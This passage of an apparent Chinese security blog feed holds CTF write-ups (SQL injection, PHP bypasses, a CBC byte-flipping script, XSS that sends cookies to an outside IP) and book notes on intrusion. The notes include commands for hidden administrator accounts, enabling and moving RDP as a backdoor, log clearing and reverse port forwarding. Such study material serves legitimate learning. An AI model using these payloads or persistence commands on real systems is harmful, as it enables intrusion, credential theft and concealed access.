password=&#39;1&#39;=&#39;&#39;</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011614_554.png" alt=""></p><h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201958_595.png" alt=""></p><pre><code>&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&#39;number&#39;])){   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);   die(&quot;have a fun!!&quot;); }foreach([$_POST] as $global_var) {     foreach($global_var as $key =&gt; $value) {         $value = trim($value);         is_string($value) &amp;&amp; $req[$key] = addslashes($value);     } } function is_palindrome_number($number) {     $number = strval($number);     $i = 0;     $j = strlen($number) - 1;     while($i &lt; $j) {         if($number[$i] !== $number[$j]) {             return false;         }         $i++;         $j--;     }     return true; } if(is_numeric($_REQUEST[&#39;number&#39;])){   $info=&quot;sorry, you cann&#39;t input a number!&quot;;}elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))){     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  }else{     $value1 = intval($req[&quot;number&quot;]);     $value2 = intval(strrev($req[&quot;number&quot;]));       if($value1!=$value2){          $info=&quot;no, this is not a palindrome number!&quot;;     }else{          if(is_palindrome_number($req[&quot;number&quot;])){              $info = &quot;nice! {$value1} is a palindrome number!&quot;;           }else{             $info=$flag;          }     }}echo $info;</code></pre><p>经过审计我们可以发现如果我们要拿到flag，POST的number需要满足以下条件：<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等。即：</p><p>intval($req[“number”])=intval(strrev($req[“number”]))<br>1<br>回文数就是类似于121这样的数。从上面可以看出2，3条件似乎是冲突滴！</p><p>下面给出两种解法：</p><p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件。通过把空字符可以绕过is_numeric的判断（如%00,%20）,所以我们构造以下poc，number=2147483647%00 和number=2147483647%20都可。</p><p>对于第一个条件，我们需要构造是让我们的poc被函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符和空字符。</p><p>而经过测试我发现is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对对于第一个空格字符会跳过空格字符判断，接着后面的判断！！<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803202002_274.png" alt=""></p><h3 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h3><p>首先代码审查</p><p>在查看页面源码中发现 代码泄露</p><pre><code>&lt;!-- $password=$_POST[&#39;password&#39;];    $sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;    $result=mysqli_query($link,$sql);        if(mysqli_num_rows($result)&gt;0){            echo &#39;flag is :&#39;.$flag;        }        else{            echo &#39;密码错误!&#39;;        } --&gt;</code></pre><p>后台对传入的 password进行MD5加密后进行数据库 </p><p>想着怎么去构造一个MD5加密后的结果 在百度上搜了下<br>找到一个字符串  ffifdyop md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串：<code>&#39;or&#39;6&lt;trash&gt;</code><br>那整个sql变成</p><pre><code>SELECT * FROM admin WHEREusername = &#39;admin&#39; and password = &#39;&#39;or&#39;6&lt;trash&gt;&#39;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011637_720.png" alt=""></p><h3 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h3><p>这题名字叫简单的登录题，实际上一点都不算简单，要认真写一个writeup确实很费劲，但pcat还是写了一篇过得去的。</p><p>1.做题的初步收集、整理<br>index.php是一个普通的登录框，输入id来登录，我们用burpsuite抓下包，并使用Repeater功能。<br>1) 当post id时候，返回包Set-cookie里包含iv和cipher，这2个英文单词玩密码学就很容易理解，iv就是Initialization Vector(初始化向量)，cipher就是密文</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011324_762.png" alt=""><br>注意这里有个提示：test.php<br>登录得到<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011334_838.png" alt=""><br>查看源码得到<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011335_302.png" alt=""><br>源码过滤|-|#|=|~|union|like|procedure这些语句</p><p>2) 使用Repeater功能不断的发送相同的包，返回的iv和cipher都不一样，基本断定每次的iv值是随机生成，另外iv和cipher的格式都是先base64编码后再进行urlencode编码。这里逻辑几句，不少人总看到base64解码后的字符是乱码后，就问该怎么解密之类的话，其实不要搞混了，base64不是一种加密方式，只是一种编码方式，base64编码后可以让不可视字符可视化（这才是最大的作用），而不起任何加密作用。<br>3) 把iv值经过urldecode再base64解码后用len()得到长度为16，基本猜测算法是aes，而且大胆猜测是aes的cbc模式<br>4) 从id=1入手，发现有#和-都会被waf检测到<br>5) 当cookies里有iv值和cipher值，然后不提交任何参数（包括id），就会显示Hello，猜测是根据传入的iv和cipher来解码后，再参与内部的sql查询出用户名<br>6) 由于aes的key值不知道，我就觉得这题比较难做了，然后先按照web题的基本思路———扫描，打开御剑扫一下，幸运的发现test.php泄露了源码。整理下源码中的逻辑：<br> <em>1 若是post id，就先进行waf检测，检测过了才随机生成iv值，并且对array(‘id’=&gt;$id)进行php的序列化操作，再进行aes加密，再分别对iv和cipher进行base64编码并设置到cookies </em>2 如果cookies里有iv和cipher，就对其base64解码，然后对其aes解密，再进行php反序列化，如果不能反序列化则返回解密后的明文的base64编码，如果可以则进行sql语句拼接，查询若是行数&gt;0就显示其username列的值，否则都是Hello!<br> <em>3 难点1，过滤了#-=,还有union和procedure </em>4 难点2，注入点在limit后面，而且后面还是”,0”，0本来就是让limit取出0行，而前面的逗号更是难弄掉<br> *5 aes的加密模式aes-128-cbc<br>7) mysql语法，limit后面只能procedure还有for update，还有尝试了堆叠注入，也是不行。<br>8) 本题算比较好点，mysql会显示错误信息，这就可以弄报错注入（当前是得有前提的）</p><p>2.构建能绕过过滤的payload<br>尝试了很多，发现post id=1;%00（这里关键是;%00）可以绕过去，然后登录后会显示Hello!rootzz，说明user表里的值是rootzz，而并不是我们所期待的flag值（如果那么简单就好了- -）<br>关键的关键字都被过滤，这可怎么办？<br>这时候要冷静分析下。<br>1) 直接post id时候是有过滤<br>2) 在cookies解密出来是没有过滤，就直接拼接sql语句<br>于是我们可以大胆猜测，修改cookies的值来达到解密后的明文可以构造sql注入。</p><p>这并不是无的放矢，在密码学里是可以做到的</p><p>3.aes的cbc byte flipping attack（cbc字节翻转攻击）<br>先放出参考文章，自己可以多去阅读<br>推荐英文文章：<br><a href="http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/" target="_blank" rel="external">http://resources.infosecinstitute.com/cbc-byte-flipping-attack-101-approach/</a><br>以下是中文译文（其中图片挂了，结合英文版就没问题）：</p><pre><code>http://wps2015.org/drops/drops/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB-101Approach.html=======</code></pre><p>cbc字节翻转攻击，我就不叙述原理，我直接演示一个简单的操作：<br>把id=12的密文修改后解析为id=1#</p><p>这里因为序列化是php的，我先写了一个php文件，便于显示</p><pre><code>&lt;?php$id=@$_POST[&#39;id&#39;];$info = array(&#39;id&#39;=&gt;$id);$plain = serialize($info);$row=ceil(strlen($plain)/16);for($i=0;$i&lt;$row;$i++){    echo substr($plain,$i*16,16).&#39;&lt;br/&gt;&#39;;}</code></pre><p>当post id=12时候，显示<br>a:1:{s:2:”id”;s:<br>2:”12”;}<br>每一行16个字节，这里12的2对应上一行{的偏离量是4<br>有这个准备后，<br>在原题里post id=12，得到下面（这只是示例）<br>iv=ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D<br>cipher=U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibcipher=&#39;U9qq54FOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D&#39;cipher_raw=b64decode(urllib.unquote(cipher))lst=list(cipher_raw)idx=4c1=&#39;2&#39;c2=&#39;#&#39;lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))cipher_new=&#39;&#39;.join(lst)cipher_new=urllib.quote(b64encode(cipher_new))print cipher_new</code></pre><p>得到cipher_new<br>U9qq55BOYcS2MFFB7UJFjVcSWpi0zsc%2BnVAnMkjkcRY%3D<br>再用之前的iv一起去访问，得到<br>base64_decode(‘g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9’) can’t unserialize<br>这是因为iv值没修改，导致无法反序列化</p><p>运行以下脚本</p><pre><code># -*- coding:utf8 -*-__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibiv=&#39;ZoP2z9EI7VWaWz%2F1GfYB6Q%3D%3D&#39;iv_raw=b64decode(urllib.unquote(iv))first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;plain=b64decode(&#39;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&#39;)iv_new=&#39;&#39;for i in range(16):    iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))iv_new=urllib.quote(b64encode(iv_new))print iv_new</code></pre><p>得到iv_new<br>hHlJ4xkEBvpldXUI0wqnNA%3D%3D<br>再跟之前的cipher_new，一起去访问，得到<br>Hello!rootzz<br>也就是id=12顺利变成了id=1#注入成功。</p><p>离成功就差一步了，<br>1) 把上面的过程编写成脚本<br>2) 尽可能只翻转一个字节，例如把2nion翻转为union，末尾再用;%00来注释掉后面<br>3) 由于逗号被过滤，用join来代替；等号被过滤，用regexp来代替</p><p>以下是pcat的脚本：</p><pre><code># -*- coding:utf8 -*-# 请保留我的个人信息，谢谢~！__author__=&#39;pcat@chamd5.org&#39;from base64 import *import urllibimport requestsimport redef mydecode(value):    return b64decode(urllib.unquote(value))def myencode(value):    return urllib.quote(b64encode(value))def mycbc(value,idx,c1,c2):    lst=list(value)    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))    return &#39;&#39;.join(lst)def pcat(payload,idx,c1,c2):    url=r&#39;http://ctf5.shiyanbar.com/web/jiandan/index.php&#39;    myd={&#39;id&#39;:payload}    res=requests.post(url,data=myd)    cookies=res.headers[&#39;Set-Cookie&#39;]    iv=re.findall(r&#39;iv=(.*?),&#39;,cookies)[0]    cipher=re.findall(r&#39;cipher=(.*)&#39;,cookies)[0]    iv_raw=mydecode(iv)    cipher_raw=mydecode(cipher)    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))    cookies_new={&#39;iv&#39;:iv,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    plain=b64decode(re.findall(r&quot;base64_decode\(&#39;(.*?)&#39;\)&quot;,cont)[0])    first=&#39;a:1:{s:2:&quot;id&quot;;s:&#39;    iv_new=&#39;&#39;    for i in range(16):        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))    iv_new=myencode(iv_new)    cookies_new={&#39;iv&#39;:iv_new,&#39;cipher&#39;:cipher_new}    cont=requests.get(url,cookies=cookies_new).content    print &#39;Payload:%s\n&gt;&gt; &#39; %(payload)    print cont    passdef foo():    pcat(&#39;12&#39;,4,&#39;2&#39;,&#39;#&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&#39;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    pcat(&#39;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#39;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &#39;you_want&#39;)b join (select 3)c);&quot;+chr(0),7,&#39;2&#39;,&#39;u&#39;)    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&#39;2&#39;,&#39;u&#39;)    passif __name__ == &#39;__main__&#39;:    foo()    print &#39;ok&#39;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第二届强网杯-部分wp</title>
      <link href="/archis/2ccf6cb2/"/>
      <url>/archis/2ccf6cb2/</url>
      
        <content type="html"><![CDATA[<p>#第二届强网杯-部分wp</p><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>flag{welcome_to_qwb}</p><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><blockquote><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p></blockquote><p>第一关<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803252209_432.png" alt=""><br>这个就是标准的弱类型了<br>取md5之后为0e开头的字符串，如<br>param1=240610708<br>param2=s878926199a<br>第二关<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803252216_349.jpg" alt=""><br>考察php的弱类型和数组绕过基础，都是恨经典的题<br>这道题不能用弱类型绕过，但是可以用数组导致md5()函数报错返回空，空===空符合条件，得到Flag。<br>param1[]=1&amp;param2[]=2<br>第三关<br>这道题可以用hash碰撞解决，字符串：</p><pre><code>param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E2%B4%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%A8%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%2Bo%F7%2Apparam2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%D8%82%3E1V4%8F%5B%AEm%AC%D46%C9%19%C6%DDS%E24%87%DA%03%FD%029c%06%D2H%CD%A0%E9%9F3B%0FW%7E%E8%CET%B6p%80%28%0D%1E%C6%98%21%BC%B6%A8%83%93%96%F9e%ABo%F7%2Ap</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803252223_324.png" alt=""></p><blockquote><p>另外还有一种方式可以把三关过掉就是使用md5碰撞</p></blockquote><pre><code>param1=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0Aj%18%B5%C3Q%0C%9A%82%CE%27%A4Cf%40%B1%FC%D6%DC%8D%DF%05%EB%B9%DF%5B%18%88%D4%A6%05%956%BC%EC-%3E%90%0F%26%FA%2C%AA%21%25%20g%A7%DB%EA%DB%89%05%A7%07%0D%14dS%20S%FB%90%B5%8A%C4T%E5%B2L%20%95%1C6%CD%17N%CE-%80%7B%9C%1E%8DN%26%1A%3A%11%BA%9E%B4%11%BD%04%99%0F%E1%9D%C4%D3%E2%D8%9E%B8%E6%7F%B3%E9%06&amp;param2=o%BC%FA%5C%0EiG%CA%1C%D7%DB%B4%E0%9B%FCF%A78%0A%EA%18%B5%C3Q%0C%9A%82%CE%27%A4Cf</code></pre><p>##welcome<br>改名.jpg<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803260100_207.png" alt=""><br>放入stegsolve<br>stereogram slover移位操作<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803260104_53.png" alt=""><br>offset 80</p><h2 id="share-you-mind"><a href="#share-you-mind" class="headerlink" title="share you mind"></a>share you mind</h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803261418_523.png" alt=""><br>发现js有rpo漏洞，其中内容可由编写的文章成为js。<br>参考文章：blog.nsfocus.net/rpo-attack/<br><a href="https://lorexxar.cn/2017/05/12/xss-bot2/" target="_blank" rel="external">https://lorexxar.cn/2017/05/12/xss-bot2/</a></p><p><a href="http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f" target="_blank" rel="external">http://39.107.33.96:20000/index.php/view/article/4643/%2f..%2f..%2f..%2f..%2f</a></p><p>提示是Try to get the cookie of path “/QWB_fl4g/QWB/”获取目录下的cookie<br>所以先获取了一下cookie，发现没有flag</p><pre><code>b=document.cookie;a=&quot;&lt;img src=//115.29.36.83:23338/&quot;+btoa(b)+&quot;&gt;&quot;;document.write(a);</code></pre><p>但是有提示是Try to get the cookie of path “/QWB_fl4g/QWB/“</p><p>那就是获取目录下的cookie</p><pre><code>var i = document.createElement(&quot;iframe&quot;);i.setAttribute(&quot;src&quot;, &quot;/QWB_fl4g/QWB/&quot;);document.body.appendChild(i);i.addEventListener( &quot;load&quot;, function(){  var content = i.contentWindow.document.cookie;  location=&#39;//115.29.36.83:23338/&#39;+btoa(content);}, false);</code></pre><p>再利用eval包含住String.fromCharCode即可，payload长度还有些限制。</p><p>QWB{flag_is_f43kth4rpo}</p><h2 id="streamgame1"><a href="#streamgame1" class="headerlink" title="streamgame1"></a>streamgame1</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>发现可以爆破<br>所以写如下脚本</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff    i = (R &amp; mask) &amp; 0xffffff    lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1    output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag     mask = 0b1010011000100011100    f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):    tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(524288, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>爆破得到<br>481387<br><code>flag{1110101100001101011}</code></p><h2 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h2><p>下载得到一个文件 末尾添加.zip<br>解压得到两个文件一个key 一个加密的py文件<br>所以查看py文件得到key加密算法<br>与上一道题相似脚本如下</p><pre><code>python# coding=utf-8  def lfsr(R, mask):      output = (R &lt;&lt; 1) &amp; 0xffffff     i = (R &amp; mask) &amp; 0xffffff     lastbit = 0     while i != 0:          lastbit ^= (i &amp; 1)          i = i &gt;&gt; 1     output ^= lastbit      return (output, lastbit)  def main1(flag):      R = flag      mask = 0x100002     f = open(&quot;key1&quot;, &quot;wb&quot;)      for i in range(12):          tmp = 0     for j in range(8):              (R, out) = lfsr(R, mask)              tmp = (tmp &lt;&lt; 1) ^ out          f.write(chr(tmp))      f.close()  key = open(&#39;key&#39;, &#39;rb&#39;)  key1 = key.read()  for x in range(0b111111111111111111111 \+ 1, -1, -1):      main1(x)      key2 = open(&#39;key1&#39;, &#39;rb&#39;)      result = key2.read()      if (result == key1):          print x          break     key2.close()</code></pre><p>flag{110111100101001101001}</p><h2 id="Three-hit-Web"><a href="#Three-hit-Web" class="headerlink" title="Three hit    Web"></a>Three hit    Web</h2><p>注册将用户名，密码，年龄写入数据库，登录过后将年龄显示出来<br>思路：每次注册一个用户，注入点放进age，登录查看</p><p>注册提交age显示只能为数字，age用16进制提交，16进制提交不会对%23url解码，所以用–代替</p><p>payload:</p><pre><code>username=Str3am1&amp;age=0x2d3636363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c322c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/j0mydok06kpm0m5gailch3p9l7.png" alt=""></p><p>因为每次都会将年龄写入数据库里面，所以每次都需要修改年龄的值</p><pre><code>username=Str3am11&amp;age=0x2d36363636363636363636363636363636363636363636363620756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167292c332c34206c696d697420312c312d2d&amp;password=1</code></pre><p><img src="http://oxskavewj.bkt.clouddn.com/72x5eade9sy8pewomdvy5w0yq4.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>黑客攻防web安全实战详解</title>
      <link href="/archis/2ab3b8ea/"/>
      <url>/archis/2ab3b8ea/</url>
      
        <content type="html"><![CDATA[<h1 id="黑客攻防web安全实战详解"><a href="#黑客攻防web安全实战详解" class="headerlink" title="黑客攻防web安全实战详解"></a>黑客攻防web安全实战详解</h1><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201801051020_332.png" alt=""></p><h2 id="第一章：网络基础"><a href="#第一章：网络基础" class="headerlink" title="第一章：网络基础"></a>第一章：网络基础</h2><p>###计算机网络<br>IP协议和TCP/IP模型<br>ip地址一般为点分十进制，4段，例如192.168.1.1<br>cmd——&gt;ipconfig 查询本机ip地址</p><p>###端口<br>范围在0-65535<br>21端口：FTP服务<br>23端口：Telnet（远程登录）服务<br>25：SMTP发送邮件<br>80：HTTP<br>109、110：POP2，POP3.<br>135：RPC<br>137：NetBIOS<br>3389：远程桌面服务端口<br>5632：远程软件<br>8080：同80用于WWW代理服务</p><p>cmd——&gt;netstat -on可查看本机开放的端口</p><p>Web服务3种协议<br>HTTP-GET 和    HTTP-POST SOAP(XML web service最常用到的) </p><h2 id="第二章：信息搜索与社会工程"><a href="#第二章：信息搜索与社会工程" class="headerlink" title="第二章：信息搜索与社会工程"></a>第二章：信息搜索与社会工程</h2><p>whois查询域名的ip和所有者信息的传输协议<br>SEO综合查询  <a href="http://tool.chinaz.com/" target="_blank" rel="external">站长工具</a></p><h3 id="常见的端口扫描技术："><a href="#常见的端口扫描技术：" class="headerlink" title="常见的端口扫描技术："></a>常见的端口扫描技术：</h3><p>TCP connect()扫描<br>TCP SYN 扫描<br>TCP FIN扫描<br>实战端口扫描</p><ol><li><a href="http://tool.chinaz.com/port" target="_blank" rel="external">站长工具</a></li><li>scanport</li></ol><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>1.wwwscan<br>2.御剑<br>3.safe3wvs</p><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>1.APPscan<br>2.x-scan<br>3.nessus<br>4.在线扫描工具scanv<br>5.jsky<br>6.Awvs<br>7.webcruiser</p><h3 id="Googlehack"><a href="#Googlehack" class="headerlink" title="Googlehack"></a>Googlehack</h3><p>www.google.com/intl/xx-hacker 黑客专用入口<br>www.google.com/custom?hl=zh-CN 中文黑客专用信息和资料搜索地址<br>www.google.com/custom?hl=en 英文黑客专用信息和资料搜索地址</p><p>intext或allintext 搜索网站正文<br>intitle或allintitle 搜索网站标题<br>cache搜索缓存内容<br>define 查找关键字的定义<br>filetype：文件名.后缀名   例如：信息安全论文 filetype:doc<br>info搜索网站基本信息<br>inurl或allinurl</p><blockquote><p>inurl: admin/login.asp site:www.sina.con<br>就会搜索这个网站下的包含 admin/login.sap的链接<br>inurl:php?id=    搜索包含:php?id=的链接</p></blockquote><p>intitle 网站标题中包含了查询关键词的网页</p><blockquote><p>[攻防 intitle：实战]</p></blockquote><p>site 指定搜索一个站<br>intext 网站正文</p><blockquote><p>site:xx.com intext:管理<br> site:xx.com intext:manage<br>  site:xx.com intext:admin<br>  site:xx.com intitle:后台<br>   site:xx.com inurl:admin</p></blockquote><p>搜索网站目录<br>index<br>转到父目录<br>to parent directory</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>一切利用人自身漏洞的行为都属于社会工程学范畴</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>net user test1 123 /add<br>其中test1 为用户名 123为密码</p><p>开启3389端口<br>“REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal””Server /v fDenyTSConnections /t REG_DWORD /d 0 /f”<br>提升用户权限：”net localgroup administrators test1 /add”<br>分别执行这两条命令，或者使用开启3389服务工具</p><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>方法一：安装远控程序<br>方法二：建立隐蔽的用户，并将远程连接端口3389改为其他端口。<br>在建立用户帐户时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏帐户，如“test$”。<br>在字符界面下执行net user命令，就无法查看到这个帐户，但是在图形界面的“本地用户和组”中仍然可以看到。在入侵了一台主机之后，一般都要想办法给自己留一个后门，而给自己加一个管理员组的帐户则是常用的手法。由于带“$”的帐户容易被发现，于是一些人就在帐户的显示名称上下功夫，建立一个看起来和系统帐户类似的名字来迷惑管理员，如admin、sysadmin、Billgates、root等。</p><pre><code>net user chun$ password /add net localgroup administrators chun$ /add 这样我们就利用“命令提示符”成功得建立了一个用户名为“chun$”，密码为“password”的简单“隐藏账户”，并且把该隐藏账户提升为了管理员权限</code></pre><p>方法三：<br>开始 –&gt; 运行 –&gt; regedit –&gt; 确定<br>依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br>分支，其下的”PortNumber”键值所对应的就是端口号，将其修改即可。上面设置完成后，需要再依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br>分支，同样将其下的”PortNumber”键值进行更改。<br>比如可以将端口改为13389</p><h4 id="清脚印"><a href="#清脚印" class="headerlink" title="清脚印"></a>清脚印</h4><p>推荐日志清除工具， aio.exe</p><h4 id="跨站脚本利用"><a href="#跨站脚本利用" class="headerlink" title="跨站脚本利用"></a>跨站脚本利用</h4><p>1.死循环</p><pre><code>&lt;script&gt;while(true)alert(&#39;炸死你！&#39;)&lt;/script&gt;</code></pre><p>2.隐藏访问</p><pre><code>&lt;script&gt;window.location.href=&quot;目标网站&quot;&lt;/script&gt;</code></pre><p>3.更加隐蔽访问</p><pre><code>&lt;iframe src=&quot;目标网站&quot; width=&quot;0&quot; height=&quot;0&quot;&gt; &lt;/iframe&gt;</code></pre><p>4.获取cookie</p><pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="web权限提升"><a href="#web权限提升" class="headerlink" title="web权限提升"></a>web权限提升</h3><p>mstsc进行远程桌面连接</p><p>内网：<br>1.反相连接<br>让远程服务器自己来向本地计算机请求，从而解决无法主动向内部服务器发送数据的问题。<br>lcx.exe是一款著名的反向连接的内网端口映射工具。<br>本机：lcx-listen 51 3389<br>这条命令的作用是将本地的51端口与3389端口开启监听状态，并且使两端互相开启映射<br>服务器：lcx.exe-slave 192.168.49.151 192.168.129 3389<br>这样3389端口服务器就会向51端口服务器请求连接，并且将从51端口获取的数据传给3389端口。</p><h3 id="基于内网的入侵"><a href="#基于内网的入侵" class="headerlink" title="基于内网的入侵"></a>基于内网的入侵</h3><p>局域网(Local Area Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能<br>决定局域网的主要技术要素为：网络拓扑，传输介质与介质访问控制方法。</p><h3 id="内网信息刺探"><a href="#内网信息刺探" class="headerlink" title="内网信息刺探"></a>内网信息刺探</h3><h4 id="获取主机网络信息"><a href="#获取主机网络信息" class="headerlink" title="获取主机网络信息"></a>获取主机网络信息</h4><p>ipconfig查询这台主机的主机名物理mac地址 IP地址 网关地址以及DNS服务器和DHCP服务器地址等信息。在获取了主机网卡信息之后，如果该主机处于域中，还可以通过的命令提示符获取域信息。<br>使用net view 显示当前域或工作组中的计算机列表，<br>使用net view /domain[:Domain Name]指定要查看其可用计算机的域，<br>net user /domain 查看域用户列表<br>net group “domain admins” /domain 查看管理组成员<br>net user Administrator/domain 查看域管理员信息<br>net /help或者net ？获取net命令可操作对象<br>获取主机用户密码</p><h4 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h4><p>APR协议可以通过Ip地址获取MAC地址</p>]]></content>
      
      
      <categories>
          
          <category> 读书摘要 </category>
          
      </categories>
      
      
